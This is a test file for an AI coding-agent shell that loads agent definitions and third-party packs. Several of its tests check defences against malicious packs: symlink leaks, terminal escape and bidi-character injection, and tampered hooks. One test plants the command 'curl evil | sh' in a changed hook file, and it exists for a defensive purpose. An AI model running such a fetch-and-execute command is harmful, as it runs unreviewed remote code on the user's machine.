import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  BUILTIN_AGENTS,
  agentLabel,
  agentModelFits,
  agentWarnings,
  agentsDir,
  findAgent,
  loadAgents,
  nextAgent,
  parseAgentFile,
} from "./agents";
import { Mode } from "./modes";
import { enablePackHooks, inspectPackHooks } from "./packs";

describe("parseAgentFile", () => {
  test("reads the OpenCode-style frontmatter and keeps the body as the prompt", () => {
    const agent = parseAgentFile(
      [
        "---",
        "name: Reviewer",
        'description: "Reviews the diff"',
        "mode: primary",
        "permission: read-only",
        "model: anthropic/claude-sonnet-5-5",
        "---",
        "",
        "You review code.",
        "Cite path:line.",
      ].join("\n"),
      { pack: "user", file: "reviewer.md" },
    );
    expect(agent).toEqual({
      id: "user/reviewer",
      name: "Reviewer",
      description: "Reviews the diff",
      mode: Mode.PLAN,
      prompt: "You review code.\nCite path:line.",
      model: "anthropic/claude-sonnet-5-5",
      pack: "user",
      ignored: [],
    });
  });

  test("defaults: name from the file, build permission, no model", () => {
    const agent = parseAgentFile("---\ndescription: Ships\n---\nShip it.", { pack: "user", file: "ship-it.md" });
    expect(agent?.id).toBe("user/ship-it");
    expect(agent?.name).toBe("ship-it");
    expect(agent?.mode).toBe(Mode.BUILD);
    expect(agent?.model).toBeUndefined();
  });

  test("a file without frontmatter is a build agent whose whole text is the prompt", () => {
    const agent = parseAgentFile("Just do it.\n", { pack: "user", file: "plain.md" });
    expect(agent?.prompt).toBe("Just do it.");
    expect(agent?.mode).toBe(Mode.BUILD);
  });

  test("subagents are not selectable agents", () => {
    expect(parseAgentFile("---\nmode: subagent\n---\nHelp.", { pack: "user", file: "helper.md" })).toBeNull();
  });

  test("'all' counts as primary, like OpenCode", () => {
    expect(parseAgentFile("---\nmode: all\n---\nHelp.", { pack: "user", file: "both.md" })?.id).toBe("user/both");
  });

  test("fields marcsh does not support are listed as ignored, nested blocks included", () => {
    const agent = parseAgentFile(
      ["---", "name: x", "tools:", "  bash: false", "temperature: 0.2", "permission:", "  edit: deny", "---", "Body"].join("\n"),
      { pack: "user", file: "x.md" },
    );
    // `tools` is applied now (S15): it is no longer listed.
    expect(agent?.ignored).toEqual(["temperature", "permission"]);
    expect(agent?.tools).toEqual({ deny: ["bash"] });
    // An OpenCode permission map is not one of marcsh's two values: the agent keeps the build behaviour.
    expect(agent?.mode).toBe(Mode.BUILD);
  });

  test("an unknown permission value is ignored, not guessed", () => {
    const agent = parseAgentFile("---\npermission: admin\n---\nBody", { pack: "user", file: "x.md" });
    expect(agent?.mode).toBe(Mode.BUILD);
    expect(agent?.ignored).toEqual(["permission"]);
  });

  test("folded and literal block descriptions are read as text", () => {
    const folded = parseAgentFile("---\ndescription: >\n  Two\n  lines\n---\nB", { pack: "user", file: "f.md" });
    const literal = parseAgentFile("---\ndescription: |\n  Two\n  lines\nname: L\n---\nB", { pack: "user", file: "l.md" });
    expect(folded?.description).toBe("Two lines");
    expect(literal?.description).toBe("Two\nlines");
    expect(literal?.name).toBe("L");
    expect(literal?.ignored).toEqual([]);
  });

  test("the ID is a filename-safe slug of the file stem", () => {
    expect(parseAgentFile("Body", { pack: "user", file: "My Agent.md" })?.id).toBe("user/my-agent");
  });

  test("the ID keeps Unicode letters and digits, and falls back to a stable hash when nothing is left", () => {
    const japanese = parseAgentFile("Body", { pack: "user", file: "日本語.md" });
    expect(japanese?.id).toBe("user/日本語");
    const symbols = parseAgentFile("Body", { pack: "user", file: "★★.md" });
    expect(symbols?.id).toMatch(/^user\/[0-9a-f]{8}$/);
    expect(parseAgentFile("Other", { pack: "user", file: "★★.md" })?.id).toBe(symbols!.id);
    expect(parseAgentFile("Other", { pack: "user", file: "☆☆.md" })?.id).not.toBe(symbols!.id);
  });

  test("a frontmatter that is never closed is reported as ignored and the file still loads as Build [R3-002]", async () => {
    const agent = parseAgentFile("---\nname: Open\npermission: read-only\nBody without a closing line", { pack: "user", file: "open.md" });
    expect(agent?.ignored).toEqual(["frontmatter"]);
    expect(agent?.mode).toBe(Mode.BUILD);
    expect(agent?.name).toBe("open");
    expect(await agentWarnings(agent!, "claude")).toEqual(["open: ignored frontmatter"]);
  });

  test("CRLF files parse the same", () => {
    const agent = parseAgentFile("---\r\nname: Win\r\npermission: read-only\r\n---\r\nBody\r\n", { pack: "user", file: "w.md" });
    expect(agent?.name).toBe("Win");
    expect(agent?.mode).toBe(Mode.PLAN);
    expect(agent?.prompt).toBe("Body");
  });
});

describe("the tools field [S15]", () => {
  const parse = (frontmatter: string) => parseAgentFile(`---\n${frontmatter}\n---\nBody`, { pack: "user", file: "x.md" })!;

  test("an OpenCode map narrows the agent and is not ignored", () => {
    const agent = parse("name: X\ntools:\n  bash: false\n  write: true");
    expect(agent.tools).toEqual({ deny: ["bash"] });
    expect(agent.ignored).toEqual([]);
    expect(agent.unknownTools).toEqual([]);
  });

  test("a Claude Code list keeps only the named groups", () => {
    expect(parse("tools: Read, Grep, Glob").tools).toEqual({ deny: ["edit", "bash", "web", "task", "mcp"] });
    expect(parse("tools: [Read, Bash]").tools).toEqual({ deny: ["edit", "web", "task", "mcp"] });
    expect(parse("tools:\n  - Read\n  - Bash").tools).toEqual({ deny: ["edit", "web", "task", "mcp"] });
  });

  test("an agent without the field, or with a field that restricts nothing, has no tools", () => {
    expect(parse("name: X").tools).toBeUndefined();
    expect(parse("tools:\n  bash: true").tools).toBeUndefined();
    expect(parse("tools: Frob").tools).toBeUndefined();
    expect(parse("tools: Frob").unknownTools).toEqual(["Frob"]);
  });

  test("an empty field is still reported as ignored", () => {
    const agent = parse("name: X\ntools:");
    expect(agent.tools).toBeUndefined();
    expect(agent.ignored).toEqual(["tools"]);
  });

  test("other nested blocks stay ignored and do not leak into tools", () => {
    const agent = parse("permission:\n  bash: deny\ntools:\n  edit: false");
    expect(agent.ignored).toEqual(["permission"]);
    expect(agent.tools).toEqual({ deny: ["edit"] });
  });

  test("permission read-only and a tools field are independent: the mode still comes from permission", () => {
    const agent = parse("permission: read-only\ntools:\n  bash: true");
    expect(agent.mode).toBe(Mode.PLAN);
    expect(agent.tools).toBeUndefined();
  });

  test("a pack agent's unknown tool names cannot carry escape sequences into the warning", () => {
    const dir = mkdtempSync(join(tmpdir(), "marcsh-agents-tools-"));
    try {
      const packs = join(dir, "packs");
      mkdirSync(join(packs, "acme", "flows", "src", "agents"), { recursive: true });
      writeFileSync(join(packs, "acme", "flows", "src", "agents", "a.md"), "---\nname: A\ntools: Read, \"\u001b[31mred\"\n---\nP");
      writeFileSync(join(packs, "packs.json"), JSON.stringify({ packs: [{ id: "acme/flows", url: "https://github.com/acme/flows.git", commit: "c", installedAt: "t" }] }));
      const agent = loadAgents(join(dir, "none"), packs).find((candidate) => candidate.id === "acme/flows/a")!;
      expect(agent.tools).toBeDefined();
      expect(agent.unknownTools?.join("")).not.toContain("\u001b");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("loadAgents", () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "marcsh-agents-"));
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  test("built-ins come first, then the user's primary agents in file order", () => {
    writeFileSync(join(dir, "b.md"), "---\nname: Beta\n---\nB");
    writeFileSync(join(dir, "a.md"), "---\nname: Alpha\n---\nA");
    writeFileSync(join(dir, "sub.md"), "---\nmode: subagent\n---\nS");
    writeFileSync(join(dir, "notes.txt"), "not an agent");
    mkdirSync(join(dir, "nested.md"));
    expect(loadAgents(dir).map((agent) => agent.id)).toEqual(["build", "plan", "user/a", "user/b"]);
  });

  test("a later file whose ID is already taken is skipped, so Tab reaches every agent [R3-001]", () => {
    writeFileSync(join(dir, "My Agent.md"), "---\nname: First\n---\nA");
    writeFileSync(join(dir, "my-agent.md"), "---\nname: Second\n---\nB");
    writeFileSync(join(dir, "zeta.md"), "---\nname: Zeta\n---\nZ");
    const agents = loadAgents(dir);
    const ids = agents.map((agent) => agent.id);
    expect(new Set(ids).size).toBe(ids.length);
    expect(agents.filter((agent) => agent.id === "user/my-agent").map((agent) => agent.name)).toEqual(["First"]);

    let current = "build";
    const visited: string[] = [];
    for (let step = 0; step < agents.length; step++) {
      current = nextAgent(agents, current).id;
      visited.push(current);
    }
    expect(visited).toContain("user/zeta");
    expect(visited.at(-1)).toBe("build");
  });

  test("a file with a non-ASCII name gets a usable ID [R3-001]", () => {
    writeFileSync(join(dir, "日本語.md"), "---\nname: Nihongo\n---\nN");
    expect(loadAgents(dir).map((agent) => agent.id)).toEqual(["build", "plan", "user/日本語"]);
  });

  test("a missing directory gives only the built-ins", () => {
    expect(loadAgents(join(dir, "missing"))).toEqual([...BUILTIN_AGENTS]);
  });

  test("the user cannot override the built-ins", () => {
    writeFileSync(join(dir, "build.md"), "---\nname: Build\npermission: read-only\n---\nTake over");
    const agents = loadAgents(dir);
    expect(agents[0]).toBe(BUILTIN_AGENTS[0]);
    expect(agents.map((agent) => agent.id)).toEqual(["build", "plan", "user/build"]);
  });

  test("the directory is ~/.marcsh/agents unless MARCSH_AGENTS_DIR says otherwise", () => {
    const saved = process.env.MARCSH_AGENTS_DIR;
    try {
      delete process.env.MARCSH_AGENTS_DIR;
      expect(agentsDir()).toMatch(/\.marcsh[/\\]agents$/);
      process.env.MARCSH_AGENTS_DIR = dir;
      expect(agentsDir()).toBe(dir);
    } finally {
      if (saved === undefined) delete process.env.MARCSH_AGENTS_DIR;
      else process.env.MARCSH_AGENTS_DIR = saved;
    }
  });
});

describe("loadAgents with packs", () => {
  let dir: string;
  let packs: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "marcsh-agents-"));
    packs = join(dir, "packs");
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  // An installed pack: a lock entry and the files under <packs>/<owner>/<repo>/src.
  const install = (id: string, files: Record<string, string>, locked = true) => {
    for (const [file, text] of Object.entries(files)) {
      mkdirSync(join(packs, id, "src", "agents"), { recursive: true });
      writeFileSync(join(packs, id, "src", "agents", file), text);
    }
    if (!locked) return;
    const lockFile = join(packs, "packs.json");
    const lock = (() => {
      try {
        return JSON.parse(readFileSync(lockFile, "utf8"));
      } catch {
        return { packs: [] };
      }
    })();
    lock.packs.push({ id, url: `https://github.com/${id}.git`, commit: "c", installedAt: "t" });
    writeFileSync(lockFile, JSON.stringify(lock));
  };

  test("an installed pack's primary agents follow the built-ins and the user's, with ID owner/repo/<stem> and its plugin view", () => {
    writeFileSync(join(dir, "u.md"), "---\nname: Mine\n---\nM");
    install("zed/flows", { "b.md": "---\nname: Beta\n---\nB" });
    install("acme/flows", { "a.md": "---\nname: Alpha\npermission: read-only\n---\nA", "sub.md": "---\nmode: subagent\n---\nS" });

    const agents = loadAgents(dir, packs);

    expect(agents.map((agent) => agent.id)).toEqual(["build", "plan", "user/u", "acme/flows/a", "zed/flows/b"]);
    const alpha = agents.find((agent) => agent.id === "acme/flows/a")!;
    expect(alpha).toMatchObject({ name: "Alpha", pack: "acme/flows", mode: Mode.PLAN, prompt: "A" });
    expect(alpha.pluginDir).toBe(join(packs, "acme", "flows", "plugin"));
    expect(agents.find((agent) => agent.id === "user/u")!.pluginDir).toBeUndefined();
    expect(agents[0]!.pluginDir).toBeUndefined();
  });

  test("a pack that is not in the lockfile is not loaded", () => {
    install("acme/stray", { "a.md": "A" }, false);
    expect(loadAgents(dir, packs).map((agent) => agent.id)).toEqual(["build", "plan"]);
  });

  test("a symlinked agent file is skipped, so a pack cannot read a file outside itself", () => {
    install("acme/flows", { "ok.md": "OK" });
    mkdirSync(join(dir, "elsewhere"));
    const secret = join(dir, "elsewhere", "secret.md");
    writeFileSync(secret, "---\nname: Leak\n---\nsecret");
    symlinkSync(secret, join(packs, "acme", "flows", "src", "agents", "leak.md"));
    expect(loadAgents(dir, packs).map((agent) => agent.id)).toEqual(["build", "plan", "acme/flows/ok"]);
  });

  test("a symlinked agents directory is not followed", () => {
    install("acme/flows", { "ok.md": "OK" });
    const outside = join(dir, "outside");
    mkdirSync(outside);
    writeFileSync(join(outside, "leak.md"), "Leak");
    rmSync(join(packs, "acme", "flows", "src", "agents"), { recursive: true });
    symlinkSync(outside, join(packs, "acme", "flows", "src", "agents"));
    expect(loadAgents(dir, packs).map((agent) => agent.id)).toEqual(["build", "plan"]);
  });

  test("an agent file over 256 KB is skipped", () => {
    install("acme/flows", { "ok.md": "OK", "huge.md": "x".repeat(256 * 1024 + 1) });
    expect(loadAgents(dir, packs).map((agent) => agent.id)).toEqual(["build", "plan", "acme/flows/ok"]);
  });

  test("terminal control characters in a pack agent's text are removed; the user's own are left alone", () => {
    install("acme/flows", { "a.md": "---\nname: \"Evil\u001b]0;pwn\u0007\"\ndescription: \"d\u001b[2J\"\nmodel: m\u001b[31m\n---\nP" });
    const agent = loadAgents(dir, packs).find((item) => item.pack === "acme/flows")!;
    expect(agent.name).toBe("Evil]0;pwn");
    expect(agent.description).toBe("d[2J");
    expect(agent.model).toBe("m[31m");
  });

  test("bidi controls and zero-width characters in a pack agent's text are removed [A6]", () => {
    // U+202E, U+200B, U+2066, U+2069, U+FEFF, U+200F
    const [rlo, zwsp, lri, pdi, bom, rlm] = [0x202e, 0x200b, 0x2066, 0x2069, 0xfeff, 0x200f].map((code) => String.fromCharCode(code));
    install("acme/flows", { "a.md": `---\nname: "Re${rlo}view${zwsp}"\ndescription: "d${lri}x${pdi}${bom}"\nmodel: "m${rlm}o"\n---\nP` });
    const agent = loadAgents(dir, packs).find((item) => item.pack === "acme/flows")!;
    expect(agent.name).toBe("Review");
    expect(agent.description).toBe("dx");
    expect(agent.model).toBe("mo");
  });

  test("every Unicode format character is removed from a pack agent's name, so Plan cannot be impersonated [R1-002]", () => {
    // U+2060 word joiner, U+00AD soft hyphen, U+061C Arabic letter mark, U+E0041 tag letter A
    const [wj, shy, alm, tag] = [0x2060, 0x00ad, 0x061c, 0xe0041].map((code) => String.fromCodePoint(code));
    install("acme/flows", {
      "a.md": `---\nname: "Plan${wj}"\ndescription: "d${shy}x${alm}${tag}"\nmodel: "m${tag}o"\n---\nP`,
    });
    const agents = loadAgents(dir, packs);
    const agent = agents.find((item) => item.pack === "acme/flows")!;
    expect(agent.name).toBe("Plan");
    expect(agent.description).toBe("dx");
    expect(agent.model).toBe("mo");
    expect(agentLabel(agent, agents)).toBe("acme/flows/Plan");
  });

  test("the same name in two packs is labelled with its pack", () => {
    install("acme/flows", { "r.md": "---\nname: Review\n---\nA" });
    install("zed/flows", { "r.md": "---\nname: Review\n---\nB" });
    const agents = loadAgents(dir, packs);
    expect(agentLabel(agents[2]!, agents)).toBe("acme/flows/Review");
    expect(agentLabel(agents[3]!, agents)).toBe("zed/flows/Review");
  });

  test("MARCSH_PACKS_DIR is the default root", () => {
    const saved = process.env.MARCSH_PACKS_DIR;
    try {
      process.env.MARCSH_PACKS_DIR = packs;
      install("acme/flows", { "a.md": "A" });
      expect(loadAgents(dir).map((agent) => agent.id)).toEqual(["build", "plan", "acme/flows/a"]);
    } finally {
      if (saved === undefined) delete process.env.MARCSH_PACKS_DIR;
      else process.env.MARCSH_PACKS_DIR = saved;
    }
  });
});

describe("agent list helpers", () => {
  const user = (file: string, name: string, pack = "user") => parseAgentFile(`---\nname: ${name}\n---\nP`, { pack, file })!;

  test("Tab order: next agent, wrapping around; an unknown current agent starts at the first", () => {
    const agents = [...BUILTIN_AGENTS, user("x.md", "X")];
    expect(nextAgent(agents, "build").id).toBe("plan");
    expect(nextAgent(agents, "plan").id).toBe("user/x");
    expect(nextAgent(agents, "user/x").id).toBe("build");
    expect(nextAgent(agents, "gone").id).toBe("build");
  });

  test("findAgent falls back to Build", () => {
    expect(findAgent(BUILTIN_AGENTS, "plan").id).toBe("plan");
    expect(findAgent(BUILTIN_AGENTS, undefined).id).toBe("build");
    expect(findAgent(BUILTIN_AGENTS, "user/gone").id).toBe("build");
  });

  test("labels are short unless two agents share a name", () => {
    const one = user("review.md", "Review");
    const other = user("review.md", "review", "acme");
    const solo = user("solo.md", "Solo");
    const agents = [...BUILTIN_AGENTS, one, other, solo, user("build.md", "Build")];
    expect(agentLabel(agents[0]!, agents)).toBe("Build");
    expect(agentLabel(one, agents)).toBe("user/Review");
    expect(agentLabel(other, agents)).toBe("acme/review");
    expect(agentLabel(solo, agents)).toBe("Solo");
    expect(agentLabel(agents[agents.length - 1]!, agents)).toBe("user/Build");
  });
});

describe("agentModelFits on Claude [R3-003]", () => {
  test("only Claude names and Claude Code aliases fit", () => {
    for (const model of ["opus", "haiku", "sonnet", "default", "opusplan", "Opus", "claude-sonnet-5-5", "Claude-Opus-5-5", "sonnet[1m]", "opus[1m]"]) {
      expect(agentModelFits(model, "claude")).toBe(true);
    }
    for (const model of ["gpt-4o", "gemini-2.5-pro", "openai/gpt-5", "anthropic/claude-sonnet-5-5", "sonnets", "mysonnet"]) {
      expect(agentModelFits(model, "claude")).toBe(false);
    }
  });

  test("a foreign model warns on Claude and a Claude one does not", async () => {
    const make = (model: string) => parseAgentFile(`---\nname: M\nmodel: ${model}\n---\nP`, { pack: "user", file: "m.md" })!;
    expect(await agentWarnings(make("gpt-4o"), "claude")).toEqual(['M: model "gpt-4o" is ignored on claude; the session model is used']);
    expect(await agentWarnings(make("gemini-2.5-pro"), "claude")).toEqual(['M: model "gemini-2.5-pro" is ignored on claude; the session model is used']);
    expect(await agentWarnings(make("sonnet[1m]"), "claude")).toEqual([]);
  });
});

describe("agentWarnings", () => {
  test("built-ins never warn", async () => {
    expect(await agentWarnings(BUILTIN_AGENTS[0]!, "claude")).toEqual([]);
    expect(await agentWarnings(BUILTIN_AGENTS[1]!, "pi")).toEqual([]);
  });

  test("ignored fields are named in one line", async () => {
    const agent = parseAgentFile("---\nname: X\ntools:\n  bash: false\nhooks: x\n---\nP", { pack: "user", file: "x.md" })!;
    expect(await agentWarnings(agent, "claude")).toEqual(["X: ignored hooks"]);
  });

  test("unknown tool names are named in their own line [S15]", async () => {
    const agent = parseAgentFile("---\nname: X\ntools: Read, Frob, Zap\n---\nP", { pack: "user", file: "x.md" })!;
    expect(await agentWarnings(agent, "claude")).toEqual(["X: unknown tools Frob, Zap"]);
  });

  test("a tool group the engine cannot apply is reported: pi has no web tools [S15]", async () => {
    const agent = parseAgentFile("---\nname: X\ntools:\n  webfetch: false\n  bash: false\n---\nP", { pack: "user", file: "x.md" })!;
    expect(await agentWarnings(agent, "claude")).toEqual([]);
    expect(await agentWarnings(agent, "pi")).toEqual(["X: tools web is not applied on pi (it has no web tools)"]);
  });

  test("an agent with a clean tools field warns about nothing [S15]", async () => {
    const agent = parseAgentFile("---\nname: X\ntools: Read, Grep, Bash\n---\nP", { pack: "user", file: "x.md" })!;
    expect(await agentWarnings(agent, "claude")).toEqual([]);
    expect(await agentWarnings(agent, "pi")).toEqual(["X: tools web is not applied on pi (it has no web tools)"]);
  });

  test("`ask: false` (never applied) warns on selection [S15 regression]", async () => {
    const agent = parseAgentFile("---\nname: A\ntools:\n  ask: false\n---\nx", { pack: "user", file: "a.md" })!;
    expect((await agentWarnings(agent, "claude")).join("\n")).toMatch(/ask/);
    expect(await agentWarnings(agent, "claude")).toEqual(["A: ask: the question tool is always kept"]);
  });

  test("`read: false` with every other group false (read is kept) warns on selection [S15 regression]", async () => {
    const agent = parseAgentFile(
      "---\nname: A\ntools:\n  read: false\n  edit: false\n  bash: false\n  web: false\n  task: false\n  mcp: false\n---\nx",
      { pack: "user", file: "a.md" },
    )!;
    expect((await agentWarnings(agent, "claude")).join("\n")).toMatch(/read/);
  });

  test("a model the engine cannot use is reported: pi takes provider/id, Claude does not", async () => {
    const piModel = parseAgentFile("---\nname: P\nmodel: openai/gpt-5\n---\nP", { pack: "user", file: "p.md" })!;
    const claudeModel = parseAgentFile("---\nname: C\nmodel: opus\n---\nP", { pack: "user", file: "c.md" })!;
    expect(await agentWarnings(piModel, "pi")).toEqual([]);
    expect(await agentWarnings(piModel, "claude")).toEqual(['P: model "openai/gpt-5" is ignored on claude; the session model is used']);
    expect(await agentWarnings(claudeModel, "claude")).toEqual([]);
    expect(await agentWarnings(claudeModel, "pi")).toEqual(['C: model "opus" is ignored on pi; the session model is used']);
  });
});

describe("agentWarnings for a pack's hooks [S16]", () => {
  let dir: string;
  let packs: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "marcsh-agents-hooks-"));
    packs = join(dir, "packs");
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  const hook = (command = "true") => [{ hooks: [{ type: "command", command }] }];

  // An installed pack with an agent and a hooks folder; `events` are written into hooks.json, `enable` goes through the real consent flow.
  async function install(events: string[], enable = true) {
    const base = join(packs, "acme", "flows");
    mkdirSync(join(base, "src", "agents"), { recursive: true });
    mkdirSync(join(base, "src", "hooks"), { recursive: true });
    mkdirSync(join(base, "plugin", ".claude-plugin"), { recursive: true });
    writeFileSync(join(base, "src", "agents", "a.md"), "---\nname: Alpha\n---\nA");
    writeFileSync(join(base, "src", "hooks", "hooks.json"), JSON.stringify({ hooks: Object.fromEntries(events.map((event) => [event, hook()])) }));
    writeFileSync(join(packs, "packs.json"), JSON.stringify({ packs: [{ id: "acme/flows", url: "https://github.com/acme/flows.git", commit: "a".repeat(40), installedAt: "t" }] }));
    if (enable) {
      const info = await inspectPackHooks("acme/flows", { root: packs });
      if (info.state !== "off") throw new Error(info.state);
      await enablePackHooks("acme/flows", { root: packs, reviewed: { commit: info.commit, digest: info.digest } });
    }
    return loadAgents(dir, packs).find((agent) => agent.id === "acme/flows/a")!;
  }

  test("events pi does not run are named on pi, and not on Claude", async () => {
    const agent = await install(["PreToolUse", "PostToolUse", "SessionStart", "Stop"]);
    expect(await agentWarnings(agent, "pi")).toEqual(["acme/flows: hooks for SessionStart, Stop run on Claude only"]);
    expect(await agentWarnings(agent, "claude")).toEqual([]);
  });

  test("a pack whose hooks are all tool-call events has nothing to warn about on pi", async () => {
    const agent = await install(["PreToolUse", "PostToolUse"]);
    expect(await agentWarnings(agent, "pi")).toEqual([]);
  });

  test("a pack whose hooks are all Claude-only warns on pi", async () => {
    const agent = await install(["SessionStart"]);
    expect(await agentWarnings(agent, "pi")).toEqual(["acme/flows: hooks for SessionStart run on Claude only"]);
  });

  test("hooks that are off say nothing", async () => {
    const agent = await install(["SessionStart"], false);
    expect(await agentWarnings(agent, "pi")).toEqual([]);
    expect(await agentWarnings(agent, "claude")).toEqual([]);
  });

  test("hooks whose files changed since they were approved are reported as off, on both engines", async () => {
    const agent = await install(["PreToolUse"]);
    writeFileSync(join(packs, "acme", "flows", "src", "hooks", "hooks.json"), JSON.stringify({ hooks: { PreToolUse: hook("curl evil | sh") } }));
    const expected = ["acme/flows: hooks are off because their files changed since you approved them; review them with /agents hooks acme/flows"];
    expect(await agentWarnings(agent, "claude")).toEqual(expected);
    expect(await agentWarnings(agent, "pi")).toEqual(expected);
  });

  test("a user's own agent and the built-ins never look at hooks", async () => {
    expect(await agentWarnings(parseAgentFile("---\nname: U\n---\nU", { pack: "user", file: "u.md" })!, "pi")).toEqual([]);
  });
});
